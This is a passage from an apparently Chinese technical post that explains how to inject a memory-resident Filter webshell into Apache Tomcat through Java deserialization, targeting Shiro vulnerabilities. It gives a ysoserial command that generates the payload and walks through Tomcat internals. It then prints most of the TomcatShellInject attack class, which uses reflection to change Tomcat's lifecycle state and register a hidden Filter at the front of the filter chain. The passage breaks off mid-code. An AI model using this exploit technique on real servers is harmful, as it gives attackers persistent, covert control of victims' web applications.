<p>这样，我们就能使用这个新的payload（CommonsCollections11ForTomcatEchoInject）了</p>
<div class="codehilite"><pre><span></span><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections11ForTomcatEchoInject &gt; ~/tmp/TomcatShellInject.ysoserial
</code></pre></div>

<h4 id="_2">步骤二<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h4>
<p>在使用步骤一生成的序列化数据进行反序列化攻击后，我们就能通过下面这段代码获取到request和response对象了</p>
<div class="codehilite"><pre><span></span><code>java.lang.reflect.Field f = org.apache.catalina.core.ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedRequest&quot;);
f.setAccessible(true);
ThreadLocal t = (ThreadLocal) f.get(null);
//不为空则意味着第一次反序列化的准备工作已成功
ServletRequest servletRequest = (ServletRequest) t.get()
</code></pre></div>

<p>接着，我们要做的就是动态注册Filter到tomcat中，参考<a href="https://www.jianshu.com/p/cbe1c3174d41">《动态注册之Servlet+Filter+Listener》</a>，可以看到，其中通过ServletContext对象（实际获取的是ApplicationContext，是ServletContext的实现，因为门面模式的使用，后面需要提取实际实现），实现了动态注册Filter</p>
<div class="codehilite"><pre><span></span><code>javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter(&quot;threedr3am&quot;, threedr3am);
filterRegistration.setInitParameter(&quot;encoding&quot;, &quot;utf-8&quot;);
filterRegistration.setAsyncSupported(false);
filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]{&quot;/*&quot;});
</code></pre></div>

<p>然而实际上并不管用，为什么呢？</p>
<div class="codehilite"><pre><span></span><code>private Dynamic addFilter(String filterName, String filterClass, Filter filter) throws IllegalStateException {
    if (filterName != null &amp;&amp; !filterName.equals(&quot;&quot;)) {
      if (!this.context.getState().equals(LifecycleState.STARTING_PREP)) {
        throw new IllegalStateException(sm.getString(&quot;applicationContext.addFilter.ise&quot;, new Object[]{this.getContextPath()}));
      } else {
        FilterDef filterDef = this.context.findFilterDef(filterName);
        if (filterDef == null) {
          filterDef = new FilterDef();
          filterDef.setFilterName(filterName);
          this.context.addFilterDef(filterDef);
        } else if (filterDef.getFilterName() != null &amp;&amp; filterDef.getFilterClass() != null) {
          return null;
        }

        if (filter == null) {
          filterDef.setFilterClass(filterClass);
        } else {
          filterDef.setFilterClass(filter.getClass().getName());
          filterDef.setFilter(filter);
        }

        return new ApplicationFilterRegistration(filterDef, this.context);
      }
    } else {
      throw new IllegalArgumentException(sm.getString(&quot;applicationContext.invalidFilterName&quot;, new Object[]{filterName}));
    }
}
</code></pre></div>

<p>因为<code>this.context.getState()</code>在运行时返回的state已经是<code>LifecycleState.STARTED</code>了，所以直接就抛异常了，filter根本就添加不进去。</p>
<p>不过问题不大，因为<code>this.context.getState()</code>获取的是ServletContext实现对象的context字段，从其中获取出state，那么，我们在其添加filter前，通过反射设置成<code>LifecycleState.STARTING_PREP</code>，在其顺利添加完成后，再把其恢复成<code>LifecycleState.STARTE</code>，这里必须要恢复，要不然会造成服务不可用。</p>
<p>其实上面的反射设置state值，也可以不做，因为我们看代码中，只是执行了<code>this.context.addFilterDef(filterDef)</code>，我们完全也可以通过反射context这个字段自行添加filterDef。</p>
<p>在实际执行栈中，可以看到，实际filter的创建是在org.apache.catalina.core.StandardWrapperValve#invoke执行<code>ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</code>的地方</p>
<p>跟进其实现方法，忽略不重要的代码：</p>
<div class="codehilite"><pre><span></span><code><span class="p">...</span>
<span class="n">StandardContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span><span class="w"> </span><span class="n">wrapper</span><span class="p">.</span><span class="n">getParent</span><span class="p">();</span>
<span class="n">FilterMap</span><span class="w"> </span><span class="n">filterMaps</span><span class="err">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">context</span><span class="p">.</span><span class="n">findFilterMaps</span><span class="p">();</span>
<span class="p">...</span>
<span class="o">//</span><span class="w"> </span><span class="k">Add</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">relevant</span><span class="w"> </span><span class="k">path</span><span class="o">-</span><span class="n">mapped</span><span class="w"> </span><span class="n">filters</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="k">filter</span><span class="w"> </span><span class="n">chain</span>
<span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nc">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">filterMaps</span><span class="p">.</span><span class="n">length</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">!</span><span class="n">matchDispatcher</span><span class="p">(</span><span class="n">filterMaps</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="p">,</span><span class="n">dispatcher</span><span class="p">))</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
<span class="w">    </span><span class="err">}</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">!</span><span class="n">matchFiltersURL</span><span class="p">(</span><span class="n">filterMaps</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">requestPath</span><span class="p">))</span>
<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
<span class="w">    </span><span class="n">ApplicationFilterConfig</span><span class="w"> </span><span class="n">filterConfig</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ApplicationFilterConfig</span><span class="p">)</span>
<span class="w">        </span><span class="n">context</span><span class="p">.</span><span class="n">findFilterConfig</span><span class="p">(</span><span class="n">filterMaps</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">.</span><span class="n">getFilterName</span><span class="p">());</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">filterConfig</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="k">null</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">FIXME</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nf">log</span><span class="w"> </span><span class="n">configuration</span><span class="w"> </span><span class="n">problem</span>
<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
<span class="w">    </span><span class="err">}</span>
<span class="w">    </span><span class="n">filterChain</span><span class="p">.</span><span class="n">addFilter</span><span class="p">(</span><span class="n">filterConfig</span><span class="p">);</span>
<span class="err">}</span>
</code></pre></div>

<p>可以看到，从context提取了FilterMap数组，并且遍历添加到filterChain，最终生效，但是这里有两个问题：</p>
<ol>
<li>我们最早创建的filter被封装成FilterDef添加到了context的filterDefs中，但是filterMaps中并不存在</li>
<li>跟上述一样的问题，也不存在filterConfigs中（<code>context.findFilterConfig</code>是从context的filterConfigs中获取）</li>
</ol>
<p>这两个问题，也比较简单，第一个问题，其实在下面代码执行<code>filterRegistration.addMappingForUrlPatterns</code>的时候已经添加进去了</p>
<div class="codehilite"><pre><span></span><code><span class="n">javax</span><span class="p">.</span><span class="n">servlet</span><span class="p">.</span><span class="n">FilterRegistration</span><span class="p">.</span><span class="k">Dynamic</span><span class="w"> </span><span class="n">filterRegistration</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletContext</span><span class="p">.</span><span class="n">addFilter</span><span class="p">(</span><span class="ss">&quot;threedr3am&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">threedr3am</span><span class="p">);</span>
<span class="n">filterRegistration</span><span class="p">.</span><span class="n">setInitParameter</span><span class="p">(</span><span class="ss">&quot;encoding&quot;</span><span class="p">,</span><span class="w"> </span><span class="ss">&quot;utf-8&quot;</span><span class="p">);</span>
<span class="n">filterRegistration</span><span class="p">.</span><span class="n">setAsyncSupported</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
<span class="n">filterRegistration</span><span class="p">.</span><span class="n">addMappingForUrlPatterns</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">EnumSet</span><span class="p">.</span><span class="k">of</span><span class="p">(</span><span class="n">javax</span><span class="p">.</span><span class="n">servlet</span><span class="p">.</span><span class="n">DispatcherType</span><span class="p">.</span><span class="n">REQUEST</span><span class="p">),</span><span class="w"> </span><span class="k">false</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="err">[]{</span><span class="ss">&quot;/*&quot;</span><span class="err">}</span><span class="p">);</span>
<span class="k">public</span><span class="w"> </span><span class="n">void</span><span class="w"> </span><span class="n">addMappingForUrlPatterns</span><span class="p">(</span><span class="n">EnumSet</span><span class="o">&lt;</span><span class="n">DispatcherType</span><span class="o">&gt;</span><span class="w"> </span><span class="n">dispatcherTypes</span><span class="p">,</span><span class="w"> </span><span class="k">boolean</span><span class="w"> </span><span class="n">isMatchAfter</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">...</span><span class="w"> </span><span class="n">urlPatterns</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">    </span><span class="n">FilterMap</span><span class="w"> </span><span class="n">filterMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FilterMap</span><span class="p">();</span>
<span class="w">    </span><span class="n">filterMap</span><span class="p">.</span><span class="n">setFilterName</span><span class="p">(</span><span class="n">this</span><span class="p">.</span><span class="n">filterDef</span><span class="p">.</span><span class="n">getFilterName</span><span class="p">());</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">dispatcherTypes</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="k">null</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">      </span><span class="n">Iterator</span><span class="w"> </span><span class="n">var5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dispatcherTypes</span><span class="p">.</span><span class="n">iterator</span><span class="p">();</span>

<span class="w">      </span><span class="k">while</span><span class="p">(</span><span class="n">var5</span><span class="p">.</span><span class="n">hasNext</span><span class="p">())</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="n">DispatcherType</span><span class="w"> </span><span class="n">dispatcherType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">DispatcherType</span><span class="p">)</span><span class="n">var5</span><span class="p">.</span><span class="k">next</span><span class="p">();</span>
<span class="w">        </span><span class="n">filterMap</span><span class="p">.</span><span class="n">setDispatcher</span><span class="p">(</span><span class="n">dispatcherType</span><span class="p">.</span><span class="n">name</span><span class="p">());</span>
<span class="w">      </span><span class="err">}</span>
<span class="w">    </span><span class="err">}</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">urlPatterns</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="k">null</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">      </span><span class="n">String</span><span class="err">[]</span><span class="w"> </span><span class="n">var9</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">urlPatterns</span><span class="p">;</span>
<span class="w">      </span><span class="nc">int</span><span class="w"> </span><span class="n">var10</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">urlPatterns</span><span class="p">.</span><span class="n">length</span><span class="p">;</span>

<span class="w">      </span><span class="k">for</span><span class="p">(</span><span class="nc">int</span><span class="w"> </span><span class="n">var7</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">var7</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">var10</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">var7</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">urlPattern</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var9</span><span class="o">[</span><span class="n">var7</span><span class="o">]</span><span class="p">;</span>
<span class="w">        </span><span class="n">filterMap</span><span class="p">.</span><span class="n">addURLPattern</span><span class="p">(</span><span class="n">urlPattern</span><span class="p">);</span>
<span class="w">      </span><span class="err">}</span>

<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">isMatchAfter</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="n">this</span><span class="p">.</span><span class="n">context</span><span class="p">.</span><span class="n">addFilterMap</span><span class="p">(</span><span class="n">filterMap</span><span class="p">);</span>
<span class="w">      </span><span class="err">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="n">this</span><span class="p">.</span><span class="n">context</span><span class="p">.</span><span class="n">addFilterMapBefore</span><span class="p">(</span><span class="n">filterMap</span><span class="p">);</span>
<span class="w">      </span><span class="err">}</span>
<span class="w">    </span><span class="err">}</span>

<span class="err">}</span>
</code></pre></div>

<p>而第二个问题，既然没有，我们就反射加进去就行了，不过且先看看StandardContext，它有一个方法<code>filterStart</code></p>
<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="n">boolean</span><span class="w"> </span><span class="n">filterStart</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">getLogger</span><span class="p">()</span><span class="o">.</span><span class="n">isDebugEnabled</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">this</span><span class="o">.</span><span class="n">getLogger</span><span class="p">()</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;Starting filters&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="n">boolean</span><span class="w"> </span><span class="n">ok</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">true</span><span class="p">;</span>
<span class="w">    </span><span class="n">synchronized</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">filterConfigs</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">this</span><span class="o">.</span><span class="n">filterConfigs</span><span class="o">.</span><span class="n">clear</span><span class="p">();</span>
<span class="w">      </span><span class="n">Iterator</span><span class="w"> </span><span class="n">var3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">this</span><span class="o">.</span><span class="n">filterDefs</span><span class="o">.</span><span class="n">entrySet</span><span class="p">()</span><span class="o">.</span><span class="n">iterator</span><span class="p">();</span>

<span class="w">      </span><span class="k">while</span><span class="p">(</span><span class="n">var3</span><span class="o">.</span><span class="n">hasNext</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">Entry</span><span class="o">&lt;</span><span class="nb nb-Type">String</span><span class="p">,</span><span class="w"> </span><span class="n">FilterDef</span><span class="o">&gt;</span><span class="w"> </span><span class="n">entry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Entry</span><span class="p">)</span><span class="n">var3</span><span class="o">.</span><span class="n">next</span><span class="p">();</span>
<span class="w">        </span><span class="nb nb-Type">String</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nb nb-Type">String</span><span class="p">)</span><span class="n">entry</span><span class="o">.</span><span class="n">getKey</span><span class="p">();</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">getLogger</span><span class="p">()</span><span class="o">.</span><span class="n">isDebugEnabled</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">          </span><span class="n">this</span><span class="o">.</span><span class="n">getLogger</span><span class="p">()</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot; Starting filter &#39;&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;&#39;&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="n">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">          </span><span class="n">ApplicationFilterConfig</span><span class="w"> </span><span class="n">filterConfig</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">ApplicationFilterConfig</span><span class="p">(</span><span class="n">this</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">FilterDef</span><span class="p">)</span><span class="n">entry</span><span class="o">.</span><span class="n">getValue</span><span class="p">());</span>
<span class="w">          </span><span class="n">this</span><span class="o">.</span><span class="n">filterConfigs</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">filterConfig</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="n">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Throwable</span><span class="w"> </span><span class="n">var8</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">          </span><span class="n">Throwable</span><span class="w"> </span><span class="n">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ExceptionUtils</span><span class="o">.</span><span class="n">unwrapInvocationTargetException</span><span class="p">(</span><span class="n">var8</span><span class="p">);</span>
<span class="w">          </span><span class="n">ExceptionUtils</span><span class="o">.</span><span class="n">handleThrowable</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
<span class="w">          </span><span class="n">this</span><span class="o">.</span><span class="n">getLogger</span><span class="p">()</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="n">sm</span><span class="o">.</span><span class="n">getString</span><span class="p">(</span><span class="s2">&quot;standardContext.filterStart&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="nb nb-Type">Object</span><span class="p">[]{</span><span class="n">name</span><span class="p">}),</span><span class="w"> </span><span class="n">t</span><span class="p">);</span>
<span class="w">          </span><span class="n">ok</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">false</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">      </span><span class="p">}</span>

<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">ok</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>没错，它遍历了filterDefs，一个个实例化成ApplicationFilterConfig添加到filterConfigs了。</p>
<p>这两个问题解决了，是不是就完成了呢，其实还没有，还差一个优化的地方，因为我们想要把filter放到最前面，在所有filter前执行，从而解决shiro漏洞的问题。</p>
<p>也简单，我们看回<code>org.apache.catalina.core.ApplicationFilterFactory#createFilterChain</code>的代码：</p>
<div class="codehilite"><pre><span></span><code><span class="o">//</span><span class="w"> </span><span class="k">Add</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">relevant</span><span class="w"> </span><span class="k">path</span><span class="o">-</span><span class="n">mapped</span><span class="w"> </span><span class="n">filters</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="k">filter</span><span class="w"> </span><span class="n">chain</span>
<span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nc">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">filterMaps</span><span class="p">.</span><span class="n">length</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">!</span><span class="n">matchDispatcher</span><span class="p">(</span><span class="n">filterMaps</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="p">,</span><span class="n">dispatcher</span><span class="p">))</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
<span class="w">    </span><span class="err">}</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">!</span><span class="n">matchFiltersURL</span><span class="p">(</span><span class="n">filterMaps</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">requestPath</span><span class="p">))</span>
<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
<span class="w">    </span><span class="n">ApplicationFilterConfig</span><span class="w"> </span><span class="n">filterConfig</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ApplicationFilterConfig</span><span class="p">)</span>
<span class="w">        </span><span class="n">context</span><span class="p">.</span><span class="n">findFilterConfig</span><span class="p">(</span><span class="n">filterMaps</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">.</span><span class="n">getFilterName</span><span class="p">());</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">filterConfig</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="k">null</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">FIXME</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nf">log</span><span class="w"> </span><span class="n">configuration</span><span class="w"> </span><span class="n">problem</span>
<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
<span class="w">    </span><span class="err">}</span>
<span class="err">}</span>
</code></pre></div>

<p>创建的顺序是根据filterMaps的顺序来的，那么我们就有必要去修改我们添加的filter顺序到第一位了，最后，整个第二步骤的代码如下：</p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.Filter</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.FilterChain</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.FilterConfig</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.ServletException</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.ServletRequest</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.ServletResponse</span><span class="p">;</span>

<span class="o">/**</span>
 <span class="o">*</span> <span class="nd">@author</span> <span class="n">threedr3am</span>
 <span class="o">*/</span>
<span class="n">public</span> <span class="k">class</span><span class="w"> </span><span class="nc">TomcatShellInject</span> <span class="n">extends</span> <span class="n">AbstractTranslet</span> <span class="n">implements</span> <span class="n">Filter</span> <span class="p">{</span>

    <span class="n">static</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="o">/*</span><span class="n">shell注入</span><span class="err">，</span><span class="n">前提需要能拿到request</span><span class="err">、</span><span class="n">response等</span><span class="o">*/</span>
            <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">reflect</span><span class="o">.</span><span class="n">Field</span> <span class="n">f</span> <span class="o">=</span> <span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">core</span><span class="o">.</span><span class="n">ApplicationFilterChain</span><span class="o">.</span><span class="k">class</span>
<span class="w">                </span><span class="err">.</span><span class="nc">getDeclaredField</span><span class="p">(</span><span class="s2">&quot;lastServicedRequest&quot;</span><span class="p">);</span>
            <span class="n">f</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="n">true</span><span class="p">);</span>
            <span class="n">ThreadLocal</span> <span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="n">ThreadLocal</span><span class="p">)</span> <span class="n">f</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">null</span><span class="p">);</span>
            <span class="n">ServletRequest</span> <span class="n">servletRequest</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
            <span class="o">//</span><span class="n">不为空则意味着第一次反序列化的准备工作已成功</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">t</span> <span class="o">!=</span> <span class="n">null</span> <span class="o">&amp;&amp;</span> <span class="n">t</span><span class="o">.</span><span class="n">get</span><span class="p">()</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">servletRequest</span> <span class="o">=</span> <span class="p">(</span><span class="n">ServletRequest</span><span class="p">)</span> <span class="n">t</span><span class="o">.</span><span class="n">get</span><span class="p">();</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">servletRequest</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">javax</span><span class="o">.</span><span class="n">servlet</span><span class="o">.</span><span class="n">ServletContext</span> <span class="n">servletContext</span> <span class="o">=</span> <span class="n">servletRequest</span><span class="o">.</span><span class="n">getServletContext</span><span class="p">();</span>
                <span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">core</span><span class="o">.</span><span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
                <span class="o">//</span><span class="n">判断是否已有该名字的filter</span><span class="err">，</span><span class="n">有则不再添加</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">servletContext</span><span class="o">.</span><span class="n">getFilterRegistration</span><span class="p">(</span><span class="s2">&quot;threedr3am&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
                    <span class="o">//</span><span class="n">遍历出标准上下文对象</span>
                    <span class="k">for</span> <span class="p">(;</span> <span class="n">standardContext</span> <span class="o">==</span> <span class="n">null</span><span class="p">;</span> <span class="p">)</span> <span class="p">{</span>
                        <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">reflect</span><span class="o">.</span><span class="n">Field</span> <span class="n">contextField</span> <span class="o">=</span> <span class="n">servletContext</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getDeclaredField</span><span class="p">(</span><span class="s2">&quot;context&quot;</span><span class="p">);</span>
                        <span class="n">contextField</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="n">true</span><span class="p">);</span>
                        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">contextField</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">servletContext</span><span class="p">);</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">o</span> <span class="n">instanceof</span> <span class="n">javax</span><span class="o">.</span><span class="n">servlet</span><span class="o">.</span><span class="n">ServletContext</span><span class="p">)</span> <span class="p">{</span>
                            <span class="n">servletContext</span> <span class="o">=</span> <span class="p">(</span><span class="n">javax</span><span class="o">.</span><span class="n">servlet</span><span class="o">.</span><span class="n">ServletContext</span><span class="p">)</span> <span class="n">o</span><span class="p">;</span>
                        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">o</span> <span class="n">instanceof</span> <span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">core</span><span class="o">.</span><span class="n">StandardContext</span><span class="p">)</span> <span class="p">{</span>
                            <span class="n">standardContext</span> <span class="o">=</span> <span class="p">(</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">core</span><span class="o">.</span><span class="n">StandardContext</span><span class="p">)</span> <span class="n">o</span><span class="p">;</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">standardContext</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
                        <span class="o">//</span><span class="n">修改状态</span><span class="err">，</span><span class="n">要不然添加不了</span>
                        <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">reflect</span><span class="o">.</span><span class="n">Field</span> <span class="n">stateField</span> <span class="o">=</span> <span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">catalina</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">LifecycleBase</span><span class="o">.</span><span class="k">class</span>
